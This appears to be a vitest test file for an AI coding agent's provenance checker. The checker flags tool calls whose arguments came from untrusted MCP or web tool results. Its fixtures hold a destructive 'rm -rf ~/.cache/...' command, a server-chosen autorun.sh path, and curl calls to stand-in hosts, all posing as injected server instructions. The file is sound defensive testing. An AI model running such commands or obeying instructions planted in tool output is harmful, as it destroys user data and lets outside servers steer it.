import { describe, expect, it } from "vitest";
import type { ToolCallEvent, ToolResultEvent } from "../../src/core/features/index.ts";
import { createProvenance } from "../../src/octocode/permission/provenance.ts";

const cwd = "/tmp/provenance-fixture-with-a-long-shared-parent/project";
const ctx = { cwd };
const source = (toolName: string, input: Record<string, unknown>, text: string): ToolResultEvent => ({
	type: "tool_result",
	toolCallId: "result",
	toolName,
	input,
	content: [{ type: "text", text }],
	isError: false,
	details: undefined,
});
const call = (toolName: string, input: Record<string, unknown>): ToolCallEvent => ({
	type: "tool_call",
	toolCallId: "call",
	toolName,
	input,
});
const command = "rm -rf ~/.cache/application && echo untrusted-server-instruction";

describe("provenance of echoed tool arguments", () => {
	it("lets any MCP echo supplied paths without tainting their reuse or their shared parent", () => {
		const provenance = createProvenance({ workspaceRoot: () => cwd });
		const path = `${cwd}/evidence.txt`;
		provenance.record(
			source("mcp__fixture__fetch", { queries: [{ path }] }, JSON.stringify({ path, content: command })),
			ctx,
		);
		expect(
			provenance.check(call("file", { queries: [{ type: "write", path, content: "updated" }] }), ctx),
		).toBeUndefined();
		expect(
			provenance.check(call("mcp__fixture__fetch", { queries: [{ path: `${cwd}/another.txt` }] }), ctx),
		).toBeUndefined();
		expect(provenance.check(call("bash", { command }), ctx)?.why).toContain("mcp__fixture__fetch");
	});

	it("still flags a new path and URL supplied only by the server", () => {
		const provenance = createProvenance({ workspaceRoot: () => cwd });
		const path = "/outside/server-chosen-folder-that-was-not-requested/autorun.sh";
		const url = "https://server-chosen.example/payload";
		provenance.record(source("mcp__fixture__fetch", { path: `${cwd}/input.md` }, `${path}\n${url}`), ctx);
		expect(provenance.check(call("file", { queries: [{ type: "write", path, content: "data" }] }), ctx)?.why).toContain(
			"mcp__fixture__fetch",
		);
		expect(provenance.check(call("bash", { command: `curl ${url}` }), ctx)?.why).toContain("mcp__fixture__fetch");
	});

	it("preserves earlier taint when a later call echoes untrusted input", () => {
		const provenance = createProvenance({ workspaceRoot: () => cwd });
		const url = "https://untrusted.example/run";
		provenance.record(source("web", { url: "https://docs.example/start" }, `${command}\n${url}`), ctx);
		provenance.record(source("mcp__fixture__echo", { query: command, url }, `${command}\n${url}`), ctx);
		expect(provenance.check(call("bash", { command }), ctx)?.why).toContain("web https://docs.example/start");
		expect(provenance.check(call("bash", { command: `curl ${url}` }), ctx)?.why).toContain(
			"web https://docs.example/start",
		);
	});

	it("does not exempt a server instruction merely repeated in a non-action reason", () => {
		const provenance = createProvenance({ workspaceRoot: () => cwd });
		provenance.record(source("mcp__fixture__fetch", { reason: command }, command), ctx);
		expect(provenance.check(call("bash", { command }), ctx)?.why).toContain("mcp__fixture__fetch");
	});
});
